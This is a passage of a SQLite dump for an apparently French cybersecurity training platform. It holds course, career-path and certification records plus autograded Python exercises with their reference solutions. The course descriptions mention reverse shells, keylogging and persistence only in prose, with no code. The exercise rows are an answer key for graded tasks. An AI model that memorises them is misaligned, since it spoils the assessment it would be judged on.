BEGIN TRANSACTION;
CREATE TABLE achievements (
    id TEXT PRIMARY KEY,
    code TEXT NOT NULL UNIQUE,
    title TEXT NOT NULL,
    description TEXT NOT NULL,
    icon_key TEXT,
    criteria_description TEXT
);
INSERT INTO "achievements" VALUES('ach_first_blood','first_blood','Premier Pas de Sécurité','Terminez votre première leçon sur la Triade CIA','Shield','Terminer la leçon 1 du Volume 1');
INSERT INTO "achievements" VALUES('ach_bash_master','bash_master','Maître du Terminal Linux','Complétez le script d''audit système du Projet 01','Terminal','Valider le Projet 01');
INSERT INTO "achievements" VALUES('ach_scapy_forger','scapy_forger','Artisan des Trames Réseau','Concevez et injectez votre premier paquet Scapy','Network','Réussir l''exercice Scapy du Volume 5');
INSERT INTO "achievements" VALUES('ach_capstone_hero','capstone_hero','Diplômé CyberPath 2026-2027','Validez avec succès le Capstone Final et son rapport d''audit','Award','Terminer le Capstone du Volume 12');
CREATE TABLE activity_events (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    event_type TEXT NOT NULL,
    entity_type TEXT,
    entity_id TEXT,
    metadata_json TEXT,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
CREATE TABLE bookmarks (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    lesson_id TEXT,
    course_id TEXT,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    CHECK (
        (lesson_id IS NOT NULL) +
        (course_id IS NOT NULL) = 1
    ),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE CASCADE,
    FOREIGN KEY (course_id) REFERENCES courses(id) ON DELETE CASCADE
);
CREATE TABLE career_path_skills (
    career_path_id TEXT NOT NULL,
    skill_id TEXT NOT NULL,
    importance TEXT NOT NULL DEFAULT 'recommended'
        CHECK (importance IN ('essential', 'recommended', 'optional')),
    PRIMARY KEY (career_path_id, skill_id),
    FOREIGN KEY (career_path_id) REFERENCES career_paths(id) ON DELETE CASCADE,
    FOREIGN KEY (skill_id) REFERENCES skills(id) ON DELETE CASCADE
);
CREATE TABLE career_paths (
    id TEXT PRIMARY KEY,
    slug TEXT NOT NULL UNIQUE,
    title TEXT NOT NULL,
    description_md TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))
);
INSERT INTO "career_paths" VALUES('career_soc_analyst','analyste-soc-l1-l2','Analyste SOC L1 / L2 (Cyberdéfense & Triage d''Incidents)','# Analyste SOC L1 / L2 : La Sentinelle des Systèmes

L''analyste en Centre des Opérations de Sécurité (SOC) est en première ligne face aux cyberattaques quotidiennes. Il surveille en temps réel les consoles de sécurité (SIEM, EDR, IDS/IPS), analyse les anomalies, écarte les faux positifs et déclenche les procédures de confinement en cas d''intrusion.

## Compétences Maîtresses Attendues :
- Analyse approfondie des flux de journaux (Linux Syslog, Windows EVTX, logs Web Apache/Nginx).
- Maîtrise des requêtes de détection (Splunk SPL, Elastic KQL, règles universelles Sigma).
- Compréhension des tactiques et techniques d''attaque selon la matrice MITRE ATT&CK.
- Application rigoureuse de la procédure de réponse à incident (norme NIST SP 800-61 / PICERL).

## Volumes CyberPath Recommandés :
- Volume 2 (Linux & Bash), Volume 4 (Réseaux TCP/IP), Volume 11 (Blue Team & SIEM), Volume 12 (Forensics).

## Certifications Associées :
- CompTIA Security+ (SY0-701), Cisco CyberOps Associate, GIAC GCIH.
','published','2026-11-04T20:51:45.838Z');
INSERT INTO "career_paths" VALUES('career_pentester','pentesteur-auditeur-red-team','Pentesteur / Consultant Red Team (Sécurité Offensive)','# Pentesteur / Consultant Red Team : L''Attaquant Éthique

Le pentesteur (Penetration Tester) est mandaté légalement par les entreprises pour éprouver la solidité de leurs défenses en simulant des attaques réelles. Il cartographie la surface exposée, identifie les failles de sécurité, développe des preuves de concept (PoC) et rédige des rapports d''audit détaillant les mesures de remédiation prioritaires.

## Compétences Maîtresses Attendues :
- Reconnaissance et énumération fine avec Nmap, Burp Suite Pro, Gobuster.
- Exploitation des vulnérabilités Web de l''OWASP Top 10 (SQLi, XSS, SSRF, IDOR).
- Scripting offensif en Python (Scapy, manipulation de sockets réseau, automatisation).
- Techniques d''élévation de privilèges sous Linux et Windows (GTFOBins, DLL Hijacking).
- Rédaction impeccable de rapports d''audit managériaux et techniques cotés en CVSS 3.1.

## Volumes CyberPath Recommandés :
- Volumes 4, 5, 6, 7, 8, 9 et 12 (Projet 07 Capstone).

## Certifications Associées :
- OffSec Certified Professional (OSCP), CEH v12, CompTIA PenTest+.
','published','2026-11-04T20:51:45.838Z');
INSERT INTO "career_paths" VALUES('career_devsecops','ingenieur-devsecops-cloud','Ingénieur DevSecOps & Sécurité Cloud','# Ingénieur DevSecOps : La Sécurité Intégrée au Code

L''ingénieur DevSecOps comble le fossé entre les équipes de développement logiciel, les opérations d''infrastructure et la cybersécurité. Il intègre des contrôles de sécurité automatisés tout au long du cycle de développement logiciel (Secure SDLC) dans les pipelines d''intégration et de déploiement continus (CI/CD).

## Compétences Maîtresses Attendues :
- Automatisation des analyses statiques de code (SAST), dynamiques (DAST) et de dépendances (SCA).
- Sécurisation des conteneurs Docker et des clusters Kubernetes (Images minimales, non-root, PodSecurity).
- Configuration des règles de contrôle d''accès dans le Cloud (AWS IAM, Supabase Postgres RLS, Firebase Rules).
- Maîtrise de l''Infrastructure as Code sécurisée (Terraform, Ansible) et gestion des secrets (HashiCorp Vault).

## Volumes CyberPath Recommandés :
- Volume 2 (Linux), Volume 3 (Manuel Python), Volume 7 (Web Security), Volume 10 (Cloud) et Volume 11 (DevSecOps).

## Certifications Associées :
- Certified Cloud Security Professional (CCSP), AWS Certified Security - Specialty, CKA.
','published','2026-11-04T20:51:45.838Z');
INSERT INTO "career_paths" VALUES('career_appsec_engineer','ingenieur-developpement-python-appsec','Ingénieur en Développement Python Sécurisé (AppSec)','# Ingénieur Développement Python & Application Security

L''ingénieur AppSec conçoit des architectures logicielles résilientes dès leur conception (Security by Design). En combinant une maîtrise pointue du langage Python moderne et des protocoles de sécurité, il développe des APIs sécurisées, implémente des architectures cryptographiques sans faille et garantit la conformité des données sensibles.

## Compétences Maîtresses Attendues :
- Programmation orientée objet avancée, typage statique PEP 484 et conception modulaire SOLID.
- Cryptographie appliquée : dérivation de clés PBKDF2/Argon2, chiffrement authentifié AES-256-GCM, TLS.
- Protection contre les attaques par canaux auxiliaires temporels (`secrets.compare_digest`).
- Écriture de requêtes SQL préparées infaillibles et conception de suites de tests unitaires/fuzzing.

## Volumes CyberPath Recommandés :
- Volume 3 (Manuel Complet de Python), Volume 6 (Web & SQL), Volume 7 (OWASP) et Volume 10 (Cryptographie).
','published','2026-11-04T20:51:45.838Z');
INSERT INTO "career_paths" VALUES('career_dfir_specialist','specialiste-forensic-incident-response','Spécialiste Criminalistique Numérique (DFIR)','# Spécialiste Digital Forensics & Réponse à Incident (DFIR)

Véritable détective du cyberespace, l''expert DFIR intervient après une compromission ou une fraude pour collecter des pièces à conviction numériques, analyser la mémoire vive (RAM) et reconstituer la chronologie exacte de l''intrusion tout en préservant la chaîne de traçabilité juridique.

## Compétences Maîtresses Attendues :
- Acquisition conforme à la RFC 3227 (ordre de volatilité, écriture bloquée, scellés numériques SHA-256).
- Analyse de mémoire vive avec le framework Volatility 3 (processus injectés, connexions réseau masquées).
- Analyse forensique de disques (registre Windows, Master File Table MFT, journaux EVTX, prefetch).
- Rédaction de rapports d''expertise judiciaire recevables devant les tribunaux.

## Volumes CyberPath Recommandés :
- Volume 1 (Architecture matérielle), Volume 2 (Linux), Volume 5 (Réseau Wireshark) et Volume 12 (Forensics).

## Certifications Associées :
- GIAC GCFE (Certified Forensic Examiner), GIAC GCFA, EnCE.
','published','2026-11-04T20:51:45.839Z');
INSERT INTO "career_paths" VALUES('career_grc_auditor','auditeur-gouvernance-risque-iso27001','Auditeur Gouvernance, Risque & Conformité (GRC / ISO 27001)','# Auditeur GRC & Conformité : Le Stratège de la Résilience

L''auditeur GRC assure l''alignement des systèmes d''information avec les lois en vigueur (RGPD, NIS 2, DORA) et les normes internationales de sécurité de l''information (ISO/IEC 27001, SOC 2, NIST CSF). Il évalue les risques métiers, rédige les politiques de sécurité (PSSI) et pilote les audits de conformité annuels.

## Compétences Maîtresses Attendues :
- Connaissance intime des cadres normatifs mondiaux (ISO 27001:2022, ISO 27005, EBIOS RM).
- Maîtrise du cadre légal (Code pénal Art. 323-1, RGPD, directive NIS 2).
- Évaluation et formalisation des plans de continuité d''activité (PCA) et de reprise d''activité (PRA).
- Vulgarisation des enjeux de cybersécurité auprès des conseils d''administration.

## Volumes CyberPath Recommandés :
- Volume 1 (Triade CIA & Éthique), Volume 7 (Authentification), Volume 11 (Secure SDLC) et Volume 12 (Rapport d''audit).

## Certifications Associées :
- CISA (Certified Information Systems Auditor), CRISC, Lead Auditor ISO/IEC 27001.
','published','2026-11-04T20:51:45.839Z');
CREATE TABLE certifications (
    id TEXT PRIMARY KEY,
    slug TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    provider TEXT NOT NULL,
    domain TEXT NOT NULL,
    level TEXT,
    prerequisites_md TEXT,
    official_url TEXT NOT NULL,
    price_description TEXT,
    exam_description TEXT,
    last_verified_at TEXT,
    status TEXT NOT NULL DEFAULT 'published'
        CHECK (status IN ('draft', 'published', 'archived'))
);
INSERT INTO "certifications" VALUES('cert_comptia_secplus','comptia-security-plus','CompTIA Security+ (SY0-701)','CompTIA','Cybersecurity','Associate / Entry','Connaissances fondamentales en réseaux (Volume 4) et en administration système (Volume 2).','https://www.comptia.org/certifications/security','Env. 392 $ USD selon les centres d''examen Pearson VUE','90 questions maximum (QCM et questions basées sur les performances PBQ) réparties en 90 minutes. Score de passage : 750/900.',NULL,'published');
INSERT INTO "certifications" VALUES('cert_cisco_ccna','cisco-certified-network-associate','Cisco Certified Network Associate (CCNA 200-301)','Cisco Systems','Networks','Associate','Maîtrise complète du routage IP, des modèles OSI/TCP-IP et des protocoles réseau (Volume 4 de CyberPath).','https://www.cisco.com/site/us/en/learn/training-certifications/certifications/enterprise/ccna/index.html','Env. 300 $ USD','120 minutes, environ 100 questions portant sur l''accès réseau, la connectivité IP, les services IP et les fondamentaux de sécurité.',NULL,'published');
INSERT INTO "certifications" VALUES('cert_offsec_oscp','offsec-certified-professional-oscp','OffSec Certified Professional (OSCP / PEN-200)','OffSec','Cybersecurity','Professional / Advanced','Excellente maîtrise de Linux, de Python, des outils de reconnaissance réseau et de la méthodologie CTF (Volumes 5, 8 et 9).','https://www.offsec.com/courses/pen-200/','Env. 1 649 $ USD (cours PEN-200 + 90 jours de lab + 1 passage d''examen)','Examen pratique continu de 24 heures sous surveillance vidéo, suivi de 24 heures pour la rédaction d''un rapport de test d''intrusion professionnel complet.',NULL,'published');
INSERT INTO "certifications" VALUES('cert_comptia_netplus','comptia-network-plus','CompTIA Network+ (N10-008)','CompTIA','Networks','Entry / Associate','Volumes 1 et 4 de CyberPath (Architecture des ordinateurs, modèle OSI et couches TCP/IP).','https://www.comptia.org/certifications/network','Env. 358 $ USD','90 questions en 90 minutes. Évalue la configuration des périphériques réseau, l''adressage IP et le dépannage de connectivité.',NULL,'published');
INSERT INTO "certifications" VALUES('cert_giac_gcih','giac-certified-incident-handler','GIAC Certified Incident Handler (GCIH)','GIAC / SANS Institute','Cybersecurity','Professional','Volumes 11 et 12 de CyberPath (Surveillance SOC, SIEM, cycle de réponse à incident PICERL et Digital Forensics).','https://www.giac.org/certifications/certified-incident-handler-gcih/','Env. 979 $ USD (examen seul)','Examen pratique de 4 heures combinant questions à choix multiples et exercices pratiques CyberLive dans des laboratoires virtuels.',NULL,'published');
INSERT INTO "certifications" VALUES('cert_isc2_ccsp','certified-cloud-security-professional-ccsp','Certified Cloud Security Professional (CCSP)','(ISC)²','Cybersecurity','Expert','Volume 10 de CyberPath (Architectures Cloud, RLS, IAM, chiffrement hybride).','https://www.isc2.org/certifications/ccsp','Env. 599 $ USD','150 questions en 4 heures. Valide les compétences avancées en architecture et opérations de sécurité Cloud.',NULL,'published');
INSERT INTO "certifications" VALUES('cert_eccouncil_ceh','certified-ethical-hacker-ceh','Certified Ethical Hacker (CEH v12)','EC-Council','Cybersecurity','Intermediate','Volumes 4, 6, 8 et 9 de CyberPath (Réseau, Web OWASP, Outils Pentest, Sockets).','https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/','Env. 1 199 $ USD','125 questions en 4 heures couvrant les vecteurs d''attaque, la reconnaissance réseau, le sniffing et les logiciels malveillants.',NULL,'published');
CREATE TABLE course_skills (
    course_id TEXT NOT NULL,
    skill_id TEXT NOT NULL,
    proficiency_level TEXT NOT NULL DEFAULT 'introductory'
        CHECK (proficiency_level IN ('introductory', 'working', 'proficient', 'advanced')),
    PRIMARY KEY (course_id, skill_id),
    FOREIGN KEY (course_id) REFERENCES courses(id) ON DELETE CASCADE,
    FOREIGN KEY (skill_id) REFERENCES skills(id) ON DELETE CASCADE
);
CREATE TABLE courses (
    id TEXT PRIMARY KEY,
    slug TEXT NOT NULL UNIQUE,
    title TEXT NOT NULL,
    summary TEXT NOT NULL,
    description TEXT,
    domain TEXT NOT NULL,
    difficulty TEXT NOT NULL DEFAULT 'beginner'
        CHECK (difficulty IN ('beginner', 'intermediate', 'advanced')),
    estimated_minutes INTEGER CHECK (estimated_minutes IS NULL OR estimated_minutes >= 0),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    created_by TEXT,
    published_at TEXT,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
);
INSERT INTO "courses" VALUES('c_vol1_foundations','cyberpath-volume-1-fondations','Volume 1 : Fondations Informatiques & Laboratoire Isolé','Architecture matérielle, systèmes d''exploitation, éthique déontologique et construction de votre premier laboratoire sous VirtualBox.','Ce premier volume pose les fondations indispensables à tout futur professionnel de la sécurité. Vous découvrirez le fonctionnement interne d''un ordinateur (CPU, registres, mémoire RAM, bus système), l''architecture des systèmes d''exploitation modernes (noyau Linux vs Windows NT), ainsi que les principes déontologiques et juridiques stricts encadrant la pratique du test d''intrusion. Vous finaliserez la construction d''un laboratoire de virtualisation étanche et sécurisé.','Cybersecurity','beginner',480,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol2_linux_bash','cyberpath-volume-2-linux-bash','Volume 2 : Linux, Terminal & Bash Scripting Avancé','Maîtrise du shell Bash, pipelines UNIX, gestion des processus, permissions octales et écriture de scripts d''administration système automatisés.','Linux est l''épine dorsale des infrastructures serveurs mondiales et des distributions d''audit telles que Kali Linux. Ce volume vous transforme en opérateur à l''aise sur le terminal sans interface graphique : manipulation avancée de fichiers, filtres grep/sed/awk, gestion des démons systemd, analyse des droits POSIX, permissions spéciales SUID/SGID/Sticky Bit et développement d''un script complet d''audit système (Projet 01).','Systems','beginner',600,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol3_python_core','cyberpath-volume-3-manuel-python','Volume 3 : Manuel Complet de Python — Syntaxe Moderne, POO & Algorithmes','Le socle complet de programmation logicielle : typage moderne PEP 484, programmation orientée objet, dunder methods et modularité robuste.','Inspiré directement du Manuel Complet de Python, ce volume couvre la programmation en profondeur : typage statique moderne, structures de données fondamentales (listes, tuples, dictionnaires, ensembles), gestion rigoureuse des exceptions, constructeurs __init__, encapsulation, décorateurs @property, programmation fonctionnelle et structuration de paquets professionnels pour l''ingénierie logicielle et la sécurité.','Programming','beginner',720,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol4_networking','cyberpath-volume-4-reseaux-tcpip','Volume 4 : Réseaux Informatiques, Modèles OSI, TCP/IP & Routage','Compréhension mécanique des flux réseaux : 7 couches OSI, 4 couches TCP/IP, encapsulation des trames, adressage IPv4/IPv6 et routage CIDR.','Sans compréhension intime des réseaux, il est impossible de comprendre la cybersécurité. Ce cours détaille chaque couche : trames Ethernet (Couche 2), paquets IPv4/IPv6 et en-têtes IP (Couche 3), segments TCP et datagrammes UDP (Couche 4), handshake à 3 voies (SYN, SYN-ACK, ACK), tables de routage, passerelles par défaut, protocoles ARP et DHCP, et translation d''adresses NAT.','Networks','intermediate',600,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol5_net_analysis','cyberpath-volume-5-analyse-wireshark-scapy','Volume 5 : Analyse Réseau, Wireshark, tcpdump & Crafting Scapy','Capture de trafic réseau, dissection de paquets avec Wireshark, filtres BPF et forge artisanale de trames réseau avec Scapy.','Apprenez à voir ce qui circule sur les câbles et dans les airs. Vous maîtriserez la capture avec tcpdump, la dissection fine avec Wireshark, la création de filtres d''affichage et de capture, ainsi que la programmation réseau offensive et défensive en Python avec la bibliothèque Scapy pour forger des requêtes ICMP ping sweep et comprendre le fonctionnement des attaques Man-in-the-Middle (MITM).','Networks','intermediate',660,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol6_web_sql','cyberpath-volume-6-web-http-sql','Volume 6 : Web, Architecture HTTP & Bases de Données SQL','Architecture client-serveur, en-têtes et verbes HTTP/HTTPS, sessions, cookies, modélisation relationnelle et requêtes SQL d''audit.','Le Web représente plus de 80% de la surface d''attaque applicative moderne. Ce volume explore la mécanique du protocole HTTP/1.1 et HTTP/2 : structure des requêtes et réponses, codes d''état (2xx, 3xx, 4xx, 5xx), en-têtes critiques de sécurité (CSP, HSTS, X-Frame-Options), gestion de session et de cookies (Secure, HttpOnly, SameSite), ainsi que la conception de bases de données relationnelles SQL et l''anatomie des injections SQL.','Web','intermediate',540,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol7_web_security','cyberpath-volume-7-owasp-authentification','Volume 7 : Web Security, OWASP Top 10 & Authentification Robuste','Étude et exploitation en laboratoire du Top 10 OWASP : Injections SQL, XSS, CSRF, IDOR, et conception d''architectures d''authentification sécurisées.','Plongez dans le référentiel mondial de la sécurité web. Chaque vulnérabilité du Top 10 OWASP est étudiée avec sa cause première au niveau du code, sa méthode d''exploitation éthique et son correctif défensif définitif. Vous construirez ensuite une architecture d''authentification complète intégrant le hachage sécurisé salé PBKDF2/Argon2, la gestion de jetons JWT sécurisés et des protections anti-bruteforce (Projet 03).','Cybersecurity','intermediate',720,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol8_pentest_tools','cyberpath-volume-8-outils-pentest-ctf','Volume 8 : Outils du Pentester (Nmap, Burp Suite) & Hacking Éthique CTF','Reconnaissance OSINT, cartographie de surface avec Nmap, interception proxy avec Burp Suite Pro et méthodologie de résolution de challenges CTF.','Ce volume aborde l''outillage professionnel utilisé lors des audits d''intrusion réels. Vous découvrirez comment cartographier un réseau avec Nmap (options -sS, -sV, -sC, -p-), intercepter et modifier des requêtes avec Burp Suite (Repeater, Intruder, Decoder), énumérer des répertoires cachés avec Gobuster et adopter la méthodologie méthodique nécessaire pour triompher des challenges Boot2Root (CTF) et élever ses privilèges sous Linux.','Cybersecurity','intermediate',660,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol9_python_rat','cyberpath-volume-9-rat-sockets-malware','Volume 9 : Hacking Éthique Python : Sockets, Trojan RAT, Reverse Shell & MITM','Architecture client-serveur de reverse shells en sockets purs, exfiltration de fichiers par blocs délimités, keylogger et persistance système.','Basé sur les chapitres 5 à 9 de l''ouvrage Python Hacking Éthique. Vous étudierez en profondeur la mécanique des sockets Python AF_INET et SOCK_STREAM, la gestion d''un shell distant bidirectionnel via subprocess, l''exfiltration de fichiers par paquets de 2048 octets avec délimiteur de trame, le développement d''un keylogger éducatif avec pynput, le packaging en binaire autonome via PyInstaller et l''analyse des techniques de persistance dans le registre Windows et d''exclusion Defender.','Cybersecurity','advanced',780,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol10_crypto_cloud','cyberpath-volume-10-crypto-cloud-security','Volume 10 : Cryptographie Appliquée, TLS & Sécurité Cloud','Chiffrement symétrique AES-256-GCM, asymétrique RSA-4096, dérivation PBKDF2, certificat X.509 et sécurité des backends Cloud modernes.','Comprenez la cryptographie moderne sans tomber dans les pièges de conception. Ce cours vous guide à travers les algorithmes symétriques de flux et de bloc, le chiffrement authentifié AES-GCM, les clés asymétriques RSA et courbes elliptiques (ECC), le fonctionnement détaillé de TLS 1.3, ainsi que l''évaluation des risques et la configuration des politiques de sécurité (RLS) sur Firebase et Supabase (Projet 04).','Cybersecurity','intermediate',600,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol11_blue_soc','cyberpath-volume-11-secure-dev-blue-team-soc','Volume 11 : Secure Software Development, Blue Team, SOC & SIEM','Cycle DevSecOps, intégration continue sécurisée, analyse de flux de logs, corrélation d''événements de sécurité et réponse à incident PICERL.','La défense en profondeur au sein des entreprises modernes. Ce volume vous initie au Secure SDLC, aux outils d''analyse statique SAST et de composition logicielle SCA, à la surveillance des infrastructures via les SIEM, à la rédaction de règles de détection d''intrusions Sigma et à la gestion d''un incident de sécurité selon la norme NIST SP 800-61 (Projet 05 & 06).','Cybersecurity','intermediate',720,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "courses" VALUES('c_vol12_forensics_cap','cyberpath-volume-12-forensics-rapport-capstone','Volume 12 : Digital Forensics, Pentest Professionnel & Capstone Project','Enquête forensique après compromission, analyse de mémoire RAM, rédaction d''un rapport de pentest de niveau exécutif et projet Capstone final.','Le volume de consécration de votre cursus. Vous apprendrez à préserver des preuves numériques selon les normes de la chaîne de custody (RFC 3227), extraire des artéfacts de mémoire volatile avec Volatility, reconstituer la timeline d''une intrusion et rédiger un rapport d''audit exécutif avec cotation de sévérité CVSS 3.1. Vous conclurez votre parcours avec le Capstone Final CyberPath 2026-2027.','Cybersecurity','advanced',840,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
CREATE TABLE exercise_attempts (
    id TEXT PRIMARY KEY,
    exercise_id TEXT NOT NULL,
    user_id TEXT NOT NULL,
    answer_text TEXT,
    result_status TEXT NOT NULL DEFAULT 'submitted'
        CHECK (result_status IN ('submitted', 'passed', 'failed', 'needs_review')),
    score REAL CHECK (score IS NULL OR (score >= 0 AND score <= 100)),
    feedback TEXT,
    submitted_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (exercise_id) REFERENCES exercises(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
CREATE TABLE exercises (
    id TEXT PRIMARY KEY,
    lesson_id TEXT,
    title TEXT NOT NULL,
    instructions_md TEXT NOT NULL,
    exercise_type TEXT NOT NULL
        CHECK (exercise_type IN ('coding', 'written', 'terminal', 'analysis', 'multiple_choice')),
    difficulty TEXT NOT NULL DEFAULT 'beginner'
        CHECK (difficulty IN ('beginner', 'intermediate', 'advanced')),
    starter_code TEXT,
    solution_explanation_md TEXT,
    is_autograded INTEGER NOT NULL DEFAULT 0 CHECK (is_autograded IN (0, 1)),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE SET NULL
);
INSERT INTO "exercises" VALUES('ex_les_cp_vol1_ch1','les_cp_vol1_ch1','Calculateur d''Intégrité SHA-256','Complétez la fonction Python `calculer_sha256(donnees: bytes) -> str` qui prend en entrée des octets bruts et retourne la chaîne hexadécimale du hachage SHA-256.','coding','beginner','import hashlib

def calculer_sha256(donnees: bytes) -> str:
    # Votre code ici
    pass
','```python
import hashlib

def calculer_sha256(donnees: bytes) -> str:
    return hashlib.sha256(donnees).hexdigest()

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol1_ch2','les_cp_vol1_ch2','Validation du Périmètre d''Audit (In-Scope Verification)','Écrivez une fonction Python `est_dans_le_perimetre(cible_ip: str, perimetre_autorise: list[str]) -> bool` qui vérifie si une adresse IP auditée fait strictement partie de la liste autorisée.','coding','beginner','def est_dans_le_perimetre(cible_ip: str, perimetre_autorise: list[str]) -> bool:
    # Votre code ici
    pass
','```python
def est_dans_le_perimetre(cible_ip: str, perimetre_autorise: list[str]) -> bool:
    return cible_ip.strip() in [ip.strip() for ip in perimetre_autorise]

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol1_ch3','les_cp_vol1_ch3','Analyseur de Registres x86_64','Créez une fonction Python `identifier_role_registre(nom_registre: str) -> str` qui retourne ''INSTRUCTION_POINTER'' pour RIP, ''STACK_POINTER'' pour RSP, ''BASE_POINTER'' pour RBP et ''GENERAL_PURPOSE'' pour les autres.','coding','intermediate','def identifier_role_registre(nom_registre: str) -> str:
    # Votre code ici
    pass
','```python
def identifier_role_registre(nom_registre: str) -> str:
    reg = nom_registre.upper().strip()
    if reg == ''RIP'':
        return ''INSTRUCTION_POINTER''
    elif reg == ''RSP'':
        return ''STACK_POINTER''
    elif reg == ''RBP'':
        return ''BASE_POINTER''
    return ''GENERAL_PURPOSE''

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol1_lab1','les_cp_vol1_lab1','Vérificateur de Masque Sous-Réseau','Écrivez une fonction Python `calculer_hotes_disponibles(cidr: int) -> int` qui calcule le nombre d''adresses IP utilisables pour des machines dans un sous-réseau IPv4 de préfixe CIDR donné (en soustrayant l''adresse réseau et l''adresse de broadcast).','coding','beginner','def calculer_hotes_disponibles(cidr: int) -> int:
    # Votre code ici
    pass
','```python
def calculer_hotes_disponibles(cidr: int) -> int:
    if cidr >= 31 or cidr <= 0:
        return 0
    return (2 ** (32 - cidr)) - 2

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol2_ch6','les_cp_vol2_ch6','Convertisseur de Droits Symboliques en Octal','Écrivez une fonction Python `symb_to_octal(mode: str) -> str` qui prend une chaîne de 9 caractères (ex: ''rwxr-xr--'') et retourne sa représentation octale à 3 chiffres (ex: ''754'').','coding','intermediate','def symb_to_octal(mode: str) -> str:
    # Votre code ici
    pass
','```python
def symb_to_octal(mode: str) -> str:
    valeurs = {''r'': 4, ''w'': 2, ''x'': 1, ''-'': 0}
    triplets = [mode[0:3], mode[3:6], mode[6:9]]
    octal = ''''
    for t in triplets:
        score = sum(valeurs.get(c, 0) for c in t)
        octal += str(score)
    return octal

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol2_proj1','les_cp_vol2_proj1','Détecteur de Comptes UID 0 en Python','Écrivez une fonction Python `trouver_comptes_uid_zero(contenu_passwd: str) -> list[str]` qui prend le contenu textuel d''un fichier `/etc/passwd` et retourne la liste de tous les noms d''utilisateurs possédant l''UID 0.','coding','intermediate','def trouver_comptes_uid_zero(contenu_passwd: str) -> list[str]:
    # Votre code ici
    pass
','```python
def trouver_comptes_uid_zero(contenu_passwd: str) -> list[str]:
    resultats = []
    for ligne in contenu_passwd.strip().split(''\n''):
        if not ligne or ligne.startswith(''#''):
            continue
        champs = ligne.split('':'')
        if len(champs) >= 3 and champs[2] == ''0'':
            resultats.append(champs[0])
    return resultats

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol3_ch9','les_cp_vol3_ch9','Analyseur de Codes d''État HTTP avec Pattern Matching','Écrivez une fonction Python `categoriser_http(status_code: int) -> str` qui utilise `match/case` pour retourner ''SUCCESS'' (200-299), ''REDIRECTION'' (300-399), ''CLIENT_ERROR'' (400-499), ''SERVER_ERROR'' (500-599) ou ''UNKNOWN''.','coding','beginner','def categoriser_http(status_code: int) -> str:
    # Utilisez match / case
    pass
','```python
def categoriser_http(status_code: int) -> str:
    match status_code:
